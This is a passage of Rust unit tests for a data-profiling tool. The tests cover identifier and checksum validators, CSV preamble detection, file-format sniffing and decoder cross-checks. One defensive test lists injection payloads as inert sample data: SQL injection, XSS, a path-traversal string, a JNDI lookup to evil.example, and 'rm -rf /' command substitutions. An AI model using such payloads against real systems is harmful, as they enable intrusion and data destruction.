        let long_ascii = "9".repeat(100_000);
        let long_unicode = "é".repeat(50_000);
        for s in [long_ascii.as_str(), long_unicode.as_str()] {
            let _ = is_uuid(s);
            let _ = is_ulid(s);
            let _ = is_email(s);
            let _ = is_cidr(s);
            let _ = is_iban(s);
            let _ = is_credit_card_number(s);
            let _ = is_isbn10(s);
            let _ = is_isbn13(s);
            let _ = is_ean_or_upc(s);
            let _ = is_semver(s);
            let _ = is_embedded_json(s);
            let _ = is_hex_color(s);
            let _ = is_imei(s);
            let _ = is_vin(s);
            let _ = is_jwt(s);
            let _ = base64url_decode(s);
            let _ = is_wkt_geometry(s);
            let _ = is_lat_lon_pair(s);
            let _ = is_cron_expression(s);
            let _ = hash_digest_kind(s);
            let _ = normalize_numeric_str(s);
            let _ = suggest_ideal_type(&[s], "String");
        }
    }

    #[test]
    fn is_iban_never_panics_on_a_multibyte_payload_past_the_ascii_prefix() {
        // "GB29" passes the initial byte-level alphabetic/digit gate, so
        // execution reaches the str-slice at byte offset 4 - this is only
        // safe because that gate guarantees the first 4 bytes are all
        // single-byte ASCII, making offset 4 a real char boundary no matter
        // what multi-byte content follows. Proven here, not just reasoned
        // about: this must return false, not panic.
        assert!(!is_iban("GB29café1234567890"));
        assert!(!is_iban("GB29💰💰💰💰💰💰💰💰"));
        assert!(!is_iban("XX99日本語日本語日本語"));
    }

    #[test]
    fn normalize_numeric_str_never_panics_on_multibyte_content_inside_parens() {
        // The parenthesized-negative path slices at [1..len-1], safe only
        // because starts_with('(')/ends_with(')') guarantee those are
        // single-byte ASCII characters at both ends. The function doesn't
        // judge whether the content is actually numeric - it unconditionally
        // treats "(...)" as a negation and prepends '-' - so "café" comes
        // back as "-café" (which the later i64/f64 parse will correctly
        // reject; that's suggest_ideal_type's job, not this function's).
        let (cleaned, _) = normalize_numeric_str("(café)");
        assert_eq!(cleaned, "-café");
        let (cleaned, is_pct) = normalize_numeric_str("(💰100€)");
        assert_eq!(cleaned, "-💰100");
        assert!(!is_pct);
    }

    #[test]
    fn near_miss_checksums_are_rejected_not_rounded_up() {
        // Every one of these is a real, valid identifier with exactly one
        // character tampered - proving the checksum genuinely discriminates
        // rather than just checking shape/length.
        assert!(!is_iban("GB29NWBK60161331926818")); // last digit off by one
        assert!(!is_credit_card_number("4111111111111110")); // last digit off by one
        assert!(!is_isbn10("0306406151")); // last digit off by one
        assert!(!is_isbn13("9780306406156")); // last digit off by one
        assert!(!is_ean_or_upc("4006381333930")); // last digit off by one
        assert!(!is_imei("490154203237519")); // last digit off by one
        assert!(!is_vin("1HGCM82633A004353")); // check digit off by one
    }

    #[test]
    fn near_miss_shapes_are_rejected_for_uuid_email_ipv4_ipv6_mac() {
        assert!(!is_uuid("550e8400-e29b-41d4-a716-44665544000")); // 35 chars, one short
        assert!(!is_uuid("550e8400e29b41d4a716446655440000")); // no dashes at all
        assert!(!is_uuid("gggggggg-e29b-41d4-a716-446655440000")); // non-hex group
        assert!(!is_email("user@@example.com")); // doubled '@'
        assert!(!is_email("user@example.")); // domain ends in a dot
        assert!(!is_email("user@.com")); // domain starts with a dot
        assert!(!is_ipv4("256.1.1.1")); // octet out of range
        assert!(!is_ipv4("1.2.3")); // only 3 octets
        assert!(!is_ipv4("1.2.3.4.5")); // 5 octets
        assert!(!is_ipv6("2001:db8:1")); // too few groups, no "::"
        assert!(!is_mac_address("00:1A:2B:3C:4D")); // only 5 groups
        assert!(!is_mac_address("00:1A:2B:3C:4D:5E:6F")); // 7 groups
        assert!(!is_mac_address("GG:1A:2B:3C:4D:5E")); // non-hex group
        assert!(!is_hex_color("#12345")); // 5 digits - not a valid length
        assert!(!is_hex_color("123456")); // missing '#'
        // Dot-separated, JWT-shaped, but the segments aren't real base64url
        // JSON - three dots alone must not be enough to claim JWT.
        assert!(!is_jwt("hello.world.foo"));
        assert!(!is_jwt("aGVsbG8.d29ybGQ.Zm9v")); // valid base64url, but decodes to plain text, not JSON
        assert!(!is_lat_lon_pair("999.0,999.0")); // both components out of range
        assert!(!is_lat_lon_pair("45,90")); // plain integers, no decimal signal
        assert!(!is_cidr("192.168.1.0/33")); // prefix out of range for IPv4
        assert!(!is_cidr("192.168.1.0")); // no prefix at all
        assert!(!is_ulid("01ARZ3NDEKTSV4RRFFQ69G5FA")); // 25 chars, too short
        assert!(!is_ulid("81ARZ3NDEKTSV4RRFFQ69G5FAV")); // first char overflows timestamp bits
        assert!(!is_wkt_geometry("CIRCLE(30 10, 5)")); // not a real WKT keyword
        assert!(!is_wkt_geometry("POINT(30 10")); // unbalanced parens
        assert!(!is_cron_expression("60 0 * * *")); // minute out of range
        assert!(!is_cron_expression("0 0 * *")); // only 4 fields
    }

    #[test]
    fn suggest_ideal_type_falls_back_when_a_single_value_breaks_an_otherwise_uniform_column() {
        // suggest_ideal_type requires every value in a column to match a
        // given check (.all(...)) - one broken value must veto the whole
        // column's classification rather than a majority vote deciding it,
        // since a "mostly UUIDs" column is not a trustworthy UUID column.
        let mostly_uuid = [
            "550e8400-e29b-41d4-a716-446655440000",
            "16fd2706-8baf-433b-82eb-8c7fada847da",
            "c56a4180-65aa-42ec-a945-5fd21dec0538",
            "not-a-uuid-at-all",
        ];
        let (ideal, _) = suggest_ideal_type(&mostly_uuid, "String");
        assert_ne!(ideal, "UUID");

        let mostly_ipv4 = ["192.168.1.1", "10.0.0.5", "8.8.8.8", "not-an-ip"];
        let (ideal, _) = suggest_ideal_type(&mostly_ipv4, "String");
        assert_ne!(ideal, "IPv4");
    }

    #[test]
    fn injection_style_payloads_resolve_to_a_safe_fallback_type() {
        // The tool never executes, interprets, or templates these values -
        // they're just opaque bytes to type. Confirms they resolve to a
        // plain, unremarkable type rather than tripping any heuristic into
        // a false positive (or a panic, covered separately above).
        let payloads = [
            "'; DROP TABLE users; --",
            "<script>alert(1)</script>",
            "../../../../etc/passwd",
            "${jndi:ldap://evil.example/a}",
            "$(rm -rf /)",
            "`rm -rf /`",
        ];
        let (ideal, _) = suggest_ideal_type(&payloads, "String");
        assert!(
            matches!(ideal.as_str(), "String" | "enum / category"),
            "expected a safe fallback type, got {ideal}"
        );
    }

    // --- Boundary-value tests ----------------------------------------
    // The near-miss tests above prove a value just past a valid range is
    // rejected; these prove the *inclusive* edge of that same range is
    // still accepted - the two are not the same claim, and every range
    // check in this file uses an inclusive `..=`, which is exactly where
    // an off-by-one (`<` vs `<=`) bug would hide. Every boundary value
    // here was constructed and independently verified (by hand or via a
    // throwaway harness) before being relied on, not assumed to be valid.

    #[test]
    fn is_ipv4_accepts_the_all_zero_and_all_max_addresses() {
        assert!(is_ipv4("0.0.0.0"));
        assert!(is_ipv4("255.255.255.255"));
    }

    #[test]
    fn is_ipv6_accepts_the_all_zero_and_all_max_addresses() {
        assert!(is_ipv6("::"));
        assert!(is_ipv6("ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff"));
    }

    #[test]
    fn is_cidr_accepts_the_minimum_and_maximum_prefix_length() {
        assert!(is_cidr("0.0.0.0/0"));
        assert!(is_cidr("255.255.255.255/32"));
        assert!(is_cidr("::/0"));
        assert!(is_cidr("ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff/128"));
    }

    #[test]
    fn is_credit_card_number_accepts_the_shortest_and_longest_valid_lengths() {
        // Constructed and Luhn-verified via a throwaway harness: 12 and 19
        // digits are the ISO/IEC 7812-1 range this tool accepts.
        assert!(is_credit_card_number("444444444442")); // 12 digits, shortest valid
        assert!(is_credit_card_number("4444444444444444442")); // 19 digits, longest valid
        assert!(!is_credit_card_number("44444444442")); // 11 digits - one short of valid
    }

    #[test]
    fn is_iban_accepts_the_shortest_and_longest_valid_lengths() {
        // Constructed and mod-97-verified via a throwaway harness: 15 and
        // 34 characters are the shortest and longest lengths this tool
        // accepts, matching real IBANs' own length range (Norway's are 15
        // characters, Malta's are 31, the longest issued today).
        assert!(is_iban("GB1800000000000")); // 15 chars, shortest valid
        assert!(is_iban("GB18000000000000000000000000000000")); // 34 chars, longest valid
        assert!(!is_iban("GB180000000000")); // 14 chars - one short of valid
    }

    #[test]
    fn is_lat_lon_pair_accepts_the_exact_range_boundary() {
        assert!(is_lat_lon_pair("90.0,180.0"));
        assert!(is_lat_lon_pair("-90.0,-180.0"));
        assert!(!is_lat_lon_pair("90.1,0.0")); // just past the latitude boundary
        assert!(!is_lat_lon_pair("0.0,180.1")); // just past the longitude boundary
    }

    #[test]
    fn is_cron_expression_accepts_every_fields_exact_min_and_max() {
        assert!(is_cron_expression("0 0 1 1 0")); // every field at its minimum
        assert!(is_cron_expression("59 23 31 12 7")); // every field at its maximum (dow 7 = Sunday, same as 0)
        assert!(!is_cron_expression("0 0 1 1 8")); // one past day-of-week's maximum
    }

    #[test]
    fn suggest_ideal_type_precision_loss_note_boundary_is_exactly_i64_max() {
        // i64::MAX itself fits exactly - no precision-loss note. One past
        // it overflows i64 and triggers the note. This is the actual
        // decision boundary is_plain_integer_literal cares about, not an
        // arbitrary digit count.
        let (ideal, note) = suggest_ideal_type(&["9223372036854775807"], "String"); // i64::MAX
        assert_eq!(ideal, "i64");
        assert!(!note.contains("exceed i64"));

        let (ideal, note) = suggest_ideal_type(&["9223372036854775808"], "String"); // i64::MAX + 1
        assert_eq!(ideal, "f64");
        assert!(note.contains("exceed i64"));
    }

    #[test]
    fn suggest_ideal_type_category_threshold_boundary_on_unique_count() {
        // CLAUDE.md documents the category threshold as "<=50 unique
        // values AND a uniqueness ratio under 5%" but neither edge had a
        // test locking in the exact boundary until now. Ratio is held
        // comfortably under 5% for both cases (2.5%/2.55%) - only the
        // *unique value count* crosses the documented <=50 cutoff.
        let at_50: Vec<String> = (0..2000).map(|i| format!("v{}", i % 50)).collect();
        let refs: Vec<&str> = at_50.iter().map(String::as_str).collect();
        let (ideal, _) = suggest_ideal_type(&refs, "String");
        assert_eq!(ideal, "enum / category"); // exactly 50 unique - still within the limit

        let at_51: Vec<String> = (0..2000).map(|i| format!("v{}", i % 51)).collect();
        let refs: Vec<&str> = at_51.iter().map(String::as_str).collect();
        let (ideal, _) = suggest_ideal_type(&refs, "String");
        assert_eq!(ideal, "String"); // one past the limit, even though the ratio is still tiny
    }

    #[test]
    fn suggest_ideal_type_category_threshold_boundary_on_ratio() {
        // Unique count held constant at 10 (well under the 50-value cap) -
        // only the uniqueness *ratio* crosses the documented "<5%" cutoff.
        // The check is a strict `<`, so exactly 5.0% must NOT count.
        let at_5_pct: Vec<String> = (0..200).map(|i| format!("v{}", i % 10)).collect(); // 10/200 = 5.0% exactly
        let refs: Vec<&str> = at_5_pct.iter().map(String::as_str).collect();
        let (ideal, _) = suggest_ideal_type(&refs, "String");
        assert_eq!(ideal, "String"); // exactly 5% - not under it, so this must not count

        let just_under_5_pct: Vec<String> = (0..201).map(|i| format!("v{}", i % 10)).collect(); // 10/201 ~= 4.975%
        let refs: Vec<&str> = just_under_5_pct.iter().map(String::as_str).collect();
        let (ideal, _) = suggest_ideal_type(&refs, "String");
        assert_eq!(ideal, "enum / category"); // just under 5% - now it counts
    }

    // --- Preamble-row detection tests -----------------------------------
    // Found via real-world testing (Ask A Manager's salary survey CSV, and
    // independently the HPI Pollock benchmark's own file_preamble.csv
    // fixture) rather than reasoned about in advance - both showed the
    // exact same shape: a title/banner row above the real header. See
    // detect_preamble_rows's doc comment for the exact structural signal.

    fn preamble_rows(csv_text: &str) -> usize {
        let mut tmp = TempFile::new().unwrap();
        std::io::Write::write_all(&mut tmp, csv_text.as_bytes()).unwrap();
        detect_preamble_rows(tmp.path(), b',')
    }

    #[test]
    fn detect_preamble_rows_finds_a_single_banner_row() {
        let csv = "Banner text here,,,,\nid,name,age,city,country\n1,Alice,30,NYC,US\n";
        assert_eq!(preamble_rows(csv), 1);
    }

    #[test]
    fn detect_preamble_rows_finds_a_multi_row_preamble() {
        let csv = "PREAMBLE,,,\n,,,\nid,name,age,city\n1,Alice,30,NYC\n";
        assert_eq!(preamble_rows(csv), 2);
    }

    #[test]
    fn detect_preamble_rows_finds_nothing_on_a_clean_csv() {
        let csv = "id,name,age\n1,Alice,30\n2,Bob,40\n";
        assert_eq!(preamble_rows(csv), 0);
    }

    #[test]
    fn detect_preamble_rows_does_not_misfire_on_a_single_column_file() {
        // Every leading row here is "mostly empty" by field count (1 of 1
        // fields populated), but there's only ever one field at all - the
        // >= 2 fields requirement exists specifically to keep this from
        // being misread as a preamble.
        let csv = "id\n1\n2\n3\n";
        assert_eq!(preamble_rows(csv), 0);
    }

    #[test]
    fn detect_preamble_rows_does_not_misfire_when_the_real_header_has_a_blank_column() {
        // A real header can legitimately have an unnamed column (a
        // duplicate/unlabeled field). The confirming row here is NOT fully
        // populated, so this must not be mistaken for a preamble - the
        // safe direction is a false negative, not a false positive.
        let csv = "id,name,,age\n1,Alice,x,30\n";
        assert_eq!(preamble_rows(csv), 0);
    }

    #[test]
    fn detect_preamble_rows_is_capped_at_max_preamble_scan() {
        // Ten leading mostly-empty rows in a row is far more than any real
        // banner/preamble pattern seen in practice - this must not treat
        // an oddly-shaped file as one giant preamble.
        let mut csv = String::new();
        for _ in 0..10 {
            csv.push_str("x,,\n");
        }
        csv.push_str("id,name,age\n1,Alice,30\n");
        assert_eq!(preamble_rows(&csv), 0);
    }

    // --- Signal B: metadata/row-count line ahead of a stable data body --
    // Found in three real files during a real-world sweep against the HPI
    // Pollock benchmark's own crawled-CSV survey - a scientific/numeric
    // export where line 1 is a row count, not a header (real shape:
    // "868\n0,0.0\n0.0025,0.0992676486197\n..."). Signal A above can't
    // catch this: "868" is a real, non-empty value, not padding.

    #[test]
    fn detect_preamble_rows_finds_a_row_count_line_before_stable_data() {
        let csv = "868\n0,0.0\n0.0025,0.099\n0.005,0.197\n0.0075,0.293\n0.01,0.387\n";
        assert_eq!(preamble_rows(csv), 1);
    }

    #[test]
    fn detect_preamble_rows_does_not_misfire_when_the_body_is_not_stable() {
        // Only the first two body rows share a field count; the third
        // diverges (a genuinely ragged file, not a metadata-line pattern) -
        // this must not be mistaken for signal B, since "stable" requires
        // every scanned body row to agree, not just the first neighbor.
        let csv = "868\n0,0.0\n0.0025,0.099\n0.005,0.197,extra\n0.0075,0.293\n";
        assert_eq!(preamble_rows(csv), 0);
    }

    #[test]
    fn detect_preamble_rows_does_not_misfire_on_a_genuinely_single_column_file() {
        // Every row here (including the first) has exactly 1 field - a
        // real single-column dataset, not a metadata line ahead of a
        // wider body. leading_total == body_total, so signal B must not
        // fire (there's no mismatch to detect in the first place).
        let csv = "868\n1\n2\n3\n4\n";
        assert_eq!(preamble_rows(csv), 0);
    }

    #[test]
    fn detect_preamble_rows_requires_at_least_three_corroborating_body_rows() {
        // Only 2 rows total (1 candidate + 1 body row) - not enough
        // corroboration to trust a field-count mismatch as signal B,
        // regardless of how consistent that single body row looks.
        let csv = "868\n0,0.0\n";
        assert_eq!(preamble_rows(csv), 0);
    }

    #[test]
    fn detect_preamble_rows_does_not_error_on_an_empty_file() {
        assert_eq!(preamble_rows(""), 0);
    }

    #[test]
    fn columns_from_csv_skip_rows_matches_manual_preamble_removal() {
        let with_preamble = "Banner,,,,\nid,name,age\n1,Alice,30\n2,Bob,40\n";
        let mut tmp = TempFile::new().unwrap();
        std::io::Write::write_all(&mut tmp, with_preamble.as_bytes()).unwrap();

        let cols = columns_from_csv(tmp.path(), None, b',', 1).unwrap();
        let names: Vec<&str> = cols.iter().map(|c| c.name.as_str()).collect();
        assert_eq!(names, vec!["id", "name", "age"]);
        assert_eq!(cols[0].raw_values, vec!["1", "2"]);
    }

    #[test]
    fn columns_from_csv_skip_rows_past_everything_yields_an_empty_table_not_an_error() {
        let tiny = "id,name\n1,Alice\n";
        let mut tmp = TempFile::new().unwrap();
        std::io::Write::write_all(&mut tmp, tiny.as_bytes()).unwrap();

        let cols = columns_from_csv(tmp.path(), None, b',', 100).unwrap();
        assert!(cols.is_empty());
    }

    // --- Content-sniffing tests ---------------------------------------
    // sniff_format only ever runs when the extension already failed to
    // name a format, so these test it directly against synthetic byte
    // buffers rather than through detect_format/run - real end-to-end
    // proof that a specific extensionless *file* round-trips through the
    // full reader pipeline lives in tests/integration.rs instead. Every
    // magic number below was checked against its reader crate's own
    // source (see the doc comments on sniff_format/SAS7BDAT_MAGIC), not
    // assumed - the same discipline this file's other heuristics follow.

    fn sniff_bytes(bytes: &[u8]) -> Option<InputFormat> {
        let mut tmp = TempFile::new().unwrap();
        std::io::Write::write_all(&mut tmp, bytes).unwrap();
        sniff_format(tmp.path())
    }

    fn sniff_matches(bytes: &[u8], expected: &str) {
        let got = sniff_bytes(bytes).unwrap_or_else(|| panic!("expected a match for {expected}"));
        assert_eq!(got.as_str(), expected);
    }

    #[test]
    fn sniff_format_recognizes_every_fixed_magic_number() {
        sniff_matches(b"SQLite format 3\x00rest of the file...", "sqlite");
        sniff_matches(b"Obj\x01\x04\x14avro.codec...", "avro");
        sniff_matches(b"ARROW1\x00\x00rest...", "arrow_ipc");
        sniff_matches(b"\x93NUMPY\x01\x00rest...", "npy");
        sniff_matches(
            &[0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1, 0, 0],
            "xlsx",
        );

        let mut sas = SAS7BDAT_MAGIC.to_vec();
        sas.extend_from_slice(b"...rest of a real header");
        sniff_matches(&sas, "sas7bdat");
    }

    #[test]
    fn sniff_format_recognizes_parquet_only_with_a_matching_header_and_footer() {
        let mut valid = b"PAR1".to_vec();
        valid.extend_from_slice(b"...fake row groups and footer metadata here...");
        valid.extend_from_slice(b"PAR1");
        sniff_matches(&valid, "parquet");

        // Header matches but the footer doesn't - not a real Parquet file
        // (a truncated download, or something else that happens to open
        // with "PAR1"), so this must not match.
        let mut truncated = b"PAR1".to_vec();
        truncated.extend_from_slice(b"...cut off mid-file, no footer magic");
        assert!(sniff_bytes(&truncated).is_none());
    }

    #[test]
    fn sniff_format_recognizes_both_stata_container_shapes() {
        sniff_matches(b"<stata_dta><header>...", "stata");

        // Binary format: release byte (102-116) + byte-order byte (0-2).
        sniff_matches(&[114, 1, 0, 0, 0, 0, 0, 0], "stata");

        // A release byte outside the binary range (117+ is XML-only, so a
        // bare byte 117 here is neither a real binary release nor the
        // literal "<stata_dta>" tag) must not match.
        assert!(sniff_bytes(&[117, 1, 0, 0, 0, 0, 0, 0]).is_none());
        // Byte-order byte out of range (only 0/1/2 are real).
        assert!(sniff_bytes(&[114, 5, 0, 0, 0, 0, 0, 0]).is_none());
    }

    #[test]
    fn sniff_format_recognizes_dbase_only_with_every_field_consistent() {
        // version=0x03 (dBase III), date=2026-08-20, num_records=3,
        // header_len=193, record_len=33 - a real, internally consistent
        // dBase header (the same shape as tests/fixtures/sample.dbf).
        let valid: [u8; 12] = [0x03, 126, 8, 20, 3, 0, 0, 0, 193, 0, 33, 0];
        sniff_matches(&valid, "dbase");

        // Same bytes but an impossible month (13) - a coincidental match
        // on the version byte alone must not be enough.
        let mut bad_month = valid;
        bad_month[2] = 13;
        assert!(sniff_bytes(&bad_month).is_none());

        // Same bytes but an unrecognized version byte.
        let mut bad_version = valid;
        bad_version[0] = 0x99;
        assert!(sniff_bytes(&bad_version).is_none());

        // Same bytes but a header length too short to be real (< 32).
        let mut bad_header_len = valid;
        bad_header_len[8] = 10;
        bad_header_len[9] = 0;
        assert!(sniff_bytes(&bad_header_len).is_none());
    }

    #[test]
    fn sniff_format_disambiguates_zip_based_formats_by_their_entry_names() {
        let mut xlsx = b"PK\x03\x04".to_vec();
        xlsx.extend_from_slice(b"...junk...xl/workbook.xml...more junk...");
        sniff_matches(&xlsx, "xlsx");

        let mut ods = b"PK\x03\x04".to_vec();
        ods.extend_from_slice(b"mimetypeapplication/vnd.oasis.opendocument.spreadsheet");
        sniff_matches(&ods, "xlsx");

        let mut npz = b"PK\x03\x04".to_vec();
        npz.extend_from_slice(b"...junk...scores.npy...more junk...");
        sniff_matches(&npz, "npz");

        // A real zip with none of the three signals - a generic zip file,
        // not any format this tool reads - must not match anything.
        let mut plain_zip = b"PK\x03\x04".to_vec();
        plain_zip.extend_from_slice(b"...just some unrelated archived file...");
        assert!(sniff_bytes(&plain_zip).is_none());
    }

    #[test]
    fn sniff_format_recognizes_json_and_xml_leading_characters() {
        sniff_matches(br#"{"a": 1}"#, "json");
        sniff_matches(b"[1, 2, 3]", "json");
        sniff_matches(b"  \n  {\"a\": 1}", "json"); // leading whitespace tolerated
        sniff_matches(b"<?xml version=\"1.0\"?><root/>", "xml");
        sniff_matches(b"<root><child/></root>", "xml");

        // An RFC 3164 syslog line also opens with '<', but followed by a
        // PRI digit, never a legal XML tag-name start - must not match.
        assert!(sniff_bytes(b"<34>Oct 11 22:14:15 mymachine su: some message").is_none());
    }

    #[test]
    fn sniff_format_returns_none_for_plain_text_and_empty_files() {
        assert!(sniff_bytes(b"").is_none());
        assert!(sniff_bytes(b"just,some,csv,like,text\n1,2,3,4,5").is_none());
        // TOML-shaped, deliberately not sniffed - see sniff_format's doc comment.
        assert!(sniff_bytes(b"key = value\nother_key = 1").is_none());
        assert!(sniff_bytes(b"random garbage that is not any format").is_none());
    }

    /// Cross-verification oracle for the hand-rolled zstd decoder
    /// (`zstd_support` - see Cargo.toml) against the real `zstd` crate,
    /// kept as a dev-only dependency for exactly this purpose. Covers
    /// every block/table shape this project's own fixtures happen to
    /// produce: `sample.csv.zst`-class small files (typically all-Raw or
    /// all-RLE blocks with Predefined sequence tables), and
    /// `edge_zstd_dynamic_tables.csv.zst`, large/varied enough that the
    /// real `zstd` CLI reaches for FSE_Compressed sequence tables and a
    /// genuinely FSE-compressed Huffman weight list - the exact code path
    /// a real, previously-uncaught bug in this project's own
    /// `fse_read_ncount` (an off-by-one in the accuracy-log recompute,
    /// only wrong when `remaining` lands exactly on a power of 2) was
    /// found through, the same "small fixtures alone don't stress this"
    /// lesson every other hand-roll in this file has already hit at least
    /// once.
    #[cfg(feature = "zstd")]
    #[test]
    fn zstd_reader_matches_the_zstd_crate_output_exactly() {
        for f in [
            "tests/fixtures/sample.csv.zst",
            "tests/fixtures/nested.jsonl.zst",
            "tests/fixtures/edge_zstd_dynamic_tables.csv.zst",
        ] {
            let compressed = std::fs::read(f).unwrap_or_else(|e| panic!("{f}: {e}"));
            let mine = zstd_support::zstd_decompress(compressed.as_slice())
                .unwrap_or_else(|e| panic!("{f}: hand-rolled decoder failed: {e:?}"));
            let theirs = zstd::stream::decode_all(compressed.as_slice())
                .unwrap_or_else(|e| panic!("{f}: reference `zstd` crate failed: {e}"));
            assert_eq!(mine, theirs, "{f}: decompressed bytes differ");
        }
    }

    /// Test-only: `npyz` is a dev-dependency now (see Cargo.toml and
    /// CLAUDE.md's Dependency footprint section) - `npy_support`'s own
    /// hand-rolled header/dtype parser replaced it at runtime, so this
    /// function's only remaining job is producing the "expected" side of
    /// `npy_reader_matches_the_npyz_crate_output_exactly`. A near-verbatim
    /// copy of what `columns_from_npy_reader` used to be before that
    /// module replaced it.
    #[cfg(all(test, feature = "npy"))]
    fn columns_from_npy_via_npyz<R: std::io::Read>(
        npy: npyz::NpyFile<R>,
        n_samples: usize,
    ) -> Vec<ColumnProfile> {
        fn read_uint(bytes: &[u8], big_endian: bool) -> Option<u64> {
            Some(match bytes.len() {
                1 => bytes[0] as u64,
                2 => {
                    let b: [u8; 2] = bytes.try_into().ok()?;
                    if big_endian {
                        u16::from_be_bytes(b)
                    } else {
                        u16::from_le_bytes(b)
                    }
                    .into()
                }
                4 => {
                    let b: [u8; 4] = bytes.try_into().ok()?;
                    if big_endian {
                        u32::from_be_bytes(b)
                    } else {
                        u32::from_le_bytes(b)
                    }
                    .into()
                }
                8 => {
                    let b: [u8; 8] = bytes.try_into().ok()?;
                    if big_endian {
                        u64::from_be_bytes(b)
                    } else {
                        u64::from_le_bytes(b)
                    }
                }
                _ => return None,
            })
        }
        fn hex(bytes: &[u8]) -> String {
            bytes.iter().map(|b| format!("{b:02x}")).collect()
        }
        fn scalar_to_string(ty: &npyz::TypeStr, bytes: &[u8]) -> String {
            use npyz::{Endianness, TypeChar};
            let big_endian = ty.endianness() == Endianness::Big;
            match ty.type_char() {
                TypeChar::Bool => (bytes.first() == Some(&1)).to_string(),
                TypeChar::Int => match (bytes.len(), read_uint(bytes, big_endian)) {
                    (1, Some(v)) => (v as u8 as i8).to_string(),
                    (2, Some(v)) => (v as u16 as i16).to_string(),
                    (4, Some(v)) => (v as u32 as i32).to_string(),
                    (8, Some(v)) => (v as i64).to_string(),
                    _ => hex(bytes),
                },
                TypeChar::Uint | TypeChar::TimeDelta | TypeChar::DateTime => {
                    read_uint(bytes, big_endian).map_or_else(|| hex(bytes), |v| v.to_string())
                }
                TypeChar::Float => match bytes.len() {
                    4 => {
                        let b: [u8; 4] = bytes.try_into().unwrap();
                        if big_endian {
                            f32::from_be_bytes(b)
                        } else {
                            f32::from_le_bytes(b)
                        }
                        .to_string()
                    }
                    8 => {
                        let b: [u8; 8] = bytes.try_into().unwrap();
                        if big_endian {
                            f64::from_be_bytes(b)
                        } else {
                            f64::from_le_bytes(b)
                        }
                        .to_string()
                    }
                    _ => hex(bytes),
                },
                TypeChar::ByteStr => {
                    let trimmed = bytes.split(|&b| b == 0).next().unwrap_or(bytes);
                    String::from_utf8_lossy(trimmed).into_owned()
                }
                TypeChar::UnicodeStr => {
                    let mut s = String::new();
                    for chunk in bytes.chunks_exact(4) {
                        let code = read_uint(chunk, big_endian).unwrap_or(0) as u32;
                        if code == 0 {
                            break;
                        }
                        if let Some(c) = char::from_u32(code) {
                            s.push(c);
                        }
                    }
                    s
                }
                _ => hex(bytes),
            }
        }
        fn value_to_string(dtype: &npyz::DType, bytes: &[u8]) -> String {
            match dtype {
                npyz::DType::Plain(ty) => scalar_to_string(ty, bytes),
                npyz::DType::Array(n, inner) => {
                    let Some(elem_size) = inner.num_bytes() else {
                        return hex(bytes);
                    };
                    (0..*n as usize)
                        .filter_map(|i| bytes.get(i * elem_size..(i + 1) * elem_size))
                        .map(|chunk| value_to_string(inner, chunk))
                        .collect::<Vec<_>>()
                        .join(";")
                }
                npyz::DType::Record(_) => hex(bytes),
            }
        }
        fn type_label(dtype: &npyz::DType) -> String {
            use npyz::TypeChar;
            match dtype {
                npyz::DType::Plain(ty) => match ty.type_char() {
                    TypeChar::Bool => "bool".to_string(),
                    TypeChar::Int | TypeChar::Uint => "i64".to_string(),
                    TypeChar::Float => "f64".to_string(),
                    TypeChar::ByteStr | TypeChar::UnicodeStr => "String".to_string(),
                    TypeChar::TimeDelta | TypeChar::DateTime => "Timestamp".to_string(),
                    TypeChar::Complex => "Complex".to_string(),
                    TypeChar::RawData => "Bytes".to_string(),
                    _ => "Object".to_string(),
                },
                npyz::DType::Array(_, inner) => format!("Vec<{}>", type_label(inner)),
                npyz::DType::Record(_) => "Struct".to_string(),
            }
        }

        let header = npy.header().clone();
        let dtype = header.dtype();
        let shape = header.shape().to_vec();
        let order = header.order();
        let mut reader = npy.into_inner();

        let fields: Vec<npyz::Field> = match &dtype {
            npyz::DType::Record(fields) => fields.clone(),
            other => vec![npyz::Field {
                name: "value".to_string(),
                dtype: other.clone(),
            }],
        };
        let is_record = matches!(dtype, npyz::DType::Record(_));
        let n_cols = if is_record {
            1
        } else {
            match shape.len() {
                0 | 1 => 1,
                2 => shape[1] as usize,
                n => panic!("oracle doesn't support {n}-dimensional plain arrays"),
            }
        };
        let n_rows = shape.first().copied().unwrap_or(1) as usize;
        let field_sizes: Vec<usize> = fields
            .iter()
            .map(|f| f.dtype.num_bytes().unwrap())
            .collect();
        let mut columns: Vec<Vec<String>> =
            vec![Vec::new(); if is_record { fields.len() } else { n_cols }];

        if is_record {
            let record_size: usize = field_sizes.iter().sum();
            let mut buf = vec![0u8; record_size];
            for _ in 0..n_rows {
                std::io::Read::read_exact(&mut reader, &mut buf).unwrap();
                let mut offset = 0;
                for (col_idx, (field, size)) in fields.iter().zip(&field_sizes).enumerate() {
                    columns[col_idx]
                        .push(value_to_string(&field.dtype, &buf[offset..offset + size]));
                    offset += size;
                }
            }
        } else {
            let elem_size = field_sizes[0];
            let total_elems = n_rows * n_cols;
            let mut buf = vec![0u8; total_elems * elem_size];
            std::io::Read::read_exact(&mut reader, &mut buf).unwrap();
            for row in 0..n_rows {
                for (col_idx, column) in columns.iter_mut().enumerate() {
                    let flat_index = match order {
                        npyz::Order::C => row * n_cols + col_idx,
                        npyz::Order::Fortran => col_idx * n_rows + row,
                    };
                    let start = flat_index * elem_size;
                    column.push(value_to_string(
                        &fields[0].dtype,
                        &buf[start..start + elem_size],
                    ));
                }
            }
        }

        let names: Vec<String> = if is_record {
            fields.iter().map(|f| f.name.clone()).collect()
        } else if n_cols == 1 {
            vec!["value".to_string()]
        } else {
            (0..n_cols).map(|i| format!("col_{i}")).collect()
        };
        let current_types: Vec<String> = if is_record {
            fields.iter().map(|f| type_label(&f.dtype)).collect()
        } else {
            vec![type_label(&fields[0].dtype); n_cols]
        };

        names
            .into_iter()
            .zip(current_types)
            .zip(columns)
            .map(|((name, current_type), values)| {
                let total = values.len();
                profile_column(
                    ColumnInput {
                        name,
                        current_type,
                        raw_values: values,
                        total,
                        skip_heuristics: false,
                    },
                    n_samples,
                )
            })
            .collect()
    }

    /// Cross-verification oracle for the hand-rolled NumPy `.npy`/`.npz`
    /// reader (`npy_support` - see Cargo.toml) against the real `npyz`
    /// crate, kept as a dev-only dependency for exactly this purpose.
    /// Covers a plain scalar array, a structured (record) array with a
    /// fixed-width byte-string field, and a Fortran-order 2D array - the
    /// three shapes that exercise every branch of `columns_from_npy_reader`
    /// (plain-vs-record dispatch, and the C-vs-Fortran flat-index formula).
    #[cfg(feature = "npy")]
    #[test]
    fn npy_reader_matches_the_npyz_crate_output_exactly() {
        for f in [
